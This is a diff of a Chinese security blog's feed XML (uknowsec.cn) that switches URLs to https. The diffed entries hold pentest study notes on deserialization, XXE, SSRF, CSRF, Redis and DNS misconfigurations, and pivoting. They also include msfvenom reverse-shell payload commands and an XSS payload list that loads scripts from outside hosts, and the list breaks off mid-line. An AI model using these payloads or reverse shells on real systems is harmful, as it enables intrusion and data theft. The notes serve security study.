-      <url>http://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
       <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="字符、字符集与字符序"><a href="#字符、字符集与字符序" class="headerlink" title="字符、字符集与字符序"></a>字符、字符集与字符序</h3><p>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
 <p>字符序(collation)指同一字符集内字符间的比较规则。</p>
 <h3 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。</p>
@@ -2551,7 +2551,7 @@
     
     <entry>
       <title><![CDATA[反序列化漏洞的利用与学习]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
       <content type="html"><![CDATA[<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
 <h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PHP反序列化&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">	var $a = &quot;test&quot;;</span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</span><br><span class="line">		fputs($fp,$this-&gt;a);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = $_POST[&apos;test&apos;];</span><br><span class="line">$test_unser = unserialize($test);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <p>上述代码使用了php的magic方法destruct（详情参考<a href="http://php.net/manual/en/language.oop5.magic.php" target="_blank" rel="noopener">PHP: Magic Methods</a>），而destruct是当一个对象被销毁时被自动调用的析构方法。<br>然后unserialize中参数可控，这样我们就可以构造一个序列化的对象A来控制其中的变量a的值，最终会产生漏洞。</p>
@@ -2580,7 +2580,7 @@
     
     <entry>
       <title><![CDATA[Web For Pentester I 练习笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/Web-For-Pentester-I-%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/Web-For-Pentester-I-%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>ISO镜像:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">web_for_pentester_i386.iso</a></p>
 <p>新建虚拟机添加web_for_pentester_i386.iso镜像，桥接网络即可。</p>
 <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
@@ -3029,7 +3029,7 @@
     
     <entry>
       <title><![CDATA[XML实体注入漏洞的利用与学习]]></title>
-      <url>http://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
+      <url>https://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.<br>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
 <h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><h4 id="使用simplexml-load-string函数解析body"><a href="#使用simplexml-load-string函数解析body" class="headerlink" title="使用simplexml_load_string函数解析body"></a>使用simplexml_load_string函数解析body</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line">echo $xml-&gt;name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -3081,7 +3081,7 @@
     
     <entry>
       <title><![CDATA[SSRF漏洞的利用与学习]]></title>
-      <url>http://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
+      <url>https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
       <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>SSRF(Server-side Request Forge, 服务端请求伪造)。<br>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p>
 <h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>拿常用的cURL举例，cURL默认支持的协议非常多。</p>
@@ -3147,7 +3147,7 @@
     
     <entry>
       <title><![CDATA[CSRF漏洞的利用与学习]]></title>
-      <url>http://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
+      <url>https://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
       <content type="html"><![CDATA[<h2 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h2><p>发现漏洞可利用处-&gt;构造(搭建)搭建代码-&gt;发送给用户(管理员)-&gt;触发代码(发送请求)………</p>
 <p>从这个利用的一个流程中，我们可以发现,攻击者仅仅只是做了两处工作.第一处是:发现漏洞利用处，，第二处就是构造利用代码以及发送至用户(管理员)。至于利用，你会发现CSRF与XSS不同，XSS是攻击者自己提交，等待结果，而CSRF呢，是由用户(管理员)自身提交。甚至可以说攻击者只做了构造代码的工作。</p>
 <h2 id="OWASP-CSRFTester"><a href="#OWASP-CSRFTester" class="headerlink" title="OWASP CSRFTester"></a>OWASP CSRFTester</h2><p>这是OWASP推出的CSRF半自动化软件，他省去了CSRF最繁琐的过程，代码构造。下面是软件的截图‍‍</p>
@@ -3209,7 +3209,7 @@
     
     <entry>
       <title><![CDATA[常见Web源码泄露总结]]></title>
-      <url>http://uknowsec.cn/posts/ctf/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93.html</url>
+      <url>https://uknowsec.cn/posts/ctf/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93.html</url>
       <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p>
 <h2 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h2><h3 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h3><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>hg init的时候会生成.hg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http://www.example.com/.hg/</span><br></pre></td></tr></table></figure></p>
 <h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://www.example.com/.hg/</span><br></pre></td></tr></table></figure></p>
@@ -3271,7 +3271,7 @@
     
     <entry>
       <title><![CDATA[Metasploit Framework 利用总结]]></title>
-      <url>http://uknowsec.cn/posts/skill/Meatsploit-Framework-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
+      <url>https://uknowsec.cn/posts/skill/Meatsploit-Framework-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
       <content type="html"><![CDATA[<h2 id="msfvenom-Payload-List"><a href="#msfvenom-Payload-List" class="headerlink" title="msfvenom Payload List"></a>msfvenom Payload List</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
 <h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
 <h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>
@@ -3309,7 +3309,7 @@
     
     <entry>
       <title><![CDATA[配置漏洞之redis未授权访问]]></title>
-      <url>http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html</url>
+      <url>https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html</url>
       <content type="html"><![CDATA[<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>解压缩后编译源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-2.8.3.tar.gz</span><br><span class="line">$ tar xzf redis-2.8.3.tar.gz</span><br><span class="line">$ cd redis-2.8.3</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure></p>
 <h3 id="编译完成后"><a href="#编译完成后" class="headerlink" title="编译完成后"></a>编译完成后</h3><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf。然后拷贝到一个目录下。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/redis</span><br><span class="line">cp redis-server  /usr/redis</span><br><span class="line">cp redis-benchmark /usr/redis</span><br><span class="line">cp redis-cli  /usr/redis</span><br><span class="line">cp redis.conf  /usr/redis</span><br><span class="line">cd /usr/redis</span><br></pre></td></tr></table></figure>
@@ -3363,7 +3363,7 @@
     
     <entry>
       <title><![CDATA[配置漏洞之DNS域传送信息泄露]]></title>
-      <url>http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html</url>
+      <url>https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html</url>
       <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Dns是整个互联网公司业务的基础，目前越来越多的互联网公司开始自己搭建DNS服务器做解析服务，同时由于DNS服务是基础性服务非常重要，因此很多公司会对DNS服务器进行主备配置而DNS主备之间的数据同步就会用到dns域传送，但如果配置不当，就会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p>
 <h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>DNS服务器的主备数据同步，使用的是域传送功能。 域传送关键配置项为：</p>
 <p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
@@ -3393,7 +3393,7 @@
     
     <entry>
       <title><![CDATA[配置漏洞之Rsync匿名访问]]></title>
-      <url>http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html</url>
+      <url>https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html</url>
       <content type="html"><![CDATA[<h2 id="Rsync简介"><a href="#Rsync简介" class="headerlink" title="Rsync简介"></a>Rsync简介</h2><p>Rsync，remote synchronize顾名思意就知道它是一款实现远程同步功能的软件，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
 <p>rsync是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，而且可以通过ssh方式来传输文件，这样其保密性也非常好，另外它还是免费的软件。</p>
 <p>rsync 包括如下的一些特性：</p>
@@ -3438,7 +3438,7 @@
     
     <entry>
       <title><![CDATA[浅谈ddos的测试方法]]></title>
-      <url>http://uknowsec.cn/posts/skill/%E6%B5%85%E8%B0%88ddos%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</url>
+      <url>https://uknowsec.cn/posts/skill/%E6%B5%85%E8%B0%88ddos%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</url>
       <content type="html"><![CDATA[<p>DOS（denial of service–拒绝服务）攻击的目的是使服务正常功能不可用。不像其他类型的攻击的目的是获取敏感信息，Dos攻击是不会威胁到敏感信息而是使合法用户不能使用服务。有时候Dos在其他攻击中也会存在一定的作用，比如使web应用防火墙拒绝服务，从而绕过防火墙。</p>
 <h2 id="DOS与DDOS的区别"><a href="#DOS与DDOS的区别" class="headerlink" title="DOS与DDOS的区别"></a>DOS与DDOS的区别</h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
 <p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
@@ -3527,7 +3527,7 @@
     
     <entry>
       <title><![CDATA[内网渗透中转发工具总结]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html</url>
       <content type="html"><![CDATA[<h2 id="LCX转发"><a href="#LCX转发" class="headerlink" title="LCX转发"></a>LCX转发</h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
 <p>首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）.</p>
 <p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p>
@@ -3598,7 +3598,7 @@
     
     <entry>
       <title><![CDATA[xss payload 大全]]></title>
-      <url>http://uknowsec.cn/posts/notes/xss-payload-%E5%A4%A7%E5%85%A8.html</url>
+      <url>https://uknowsec.cn/posts/notes/xss-payload-%E5%A4%A7%E5%85%A8.html</url>
       <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">(1)普通的XSS JavaScript注入</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(2)IMG标签XSS使用JavaScript命令</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(3)IMG标签无分号无引号</span><br><span class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(4)IMG标签大小写不敏感</span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(5)HTML编码(必须有分号)</span><br><span class="line">&lt;IMG SRC=javascript:alert(“XSS”)&gt;</span><br><span class="line"></span><br><span class="line">(6)修正缺陷IMG标签</span><br><span class="line">&lt;IMG “”&quot;&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</span><br><span class="line"></span><br><span class="line">(7)formCharCode标签(计算器)</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line"></span><br><span class="line">(8)UTF-8的Unicode编码(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br><span class="line"></span><br><span class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br><span class="line"></span><br><span class="line">(10)十六进制编码也是没有分号(计算器)</span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line"></span><br><span class="line">(11)嵌入式标签,将Javascript分开</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(12)嵌入式编码标签,将Javascript分开</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(13)嵌入式换行符</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(14)嵌入式回车</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</span><br><span class="line">&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;</span><br><span class="line"></span><br><span class="line">(16)解决限制字符(要求同页面)</span><br><span class="line">&lt;script&gt;z=’document.’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">(17)空字符</span><br><span class="line">perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out</span><br><span class="line"></span><br><span 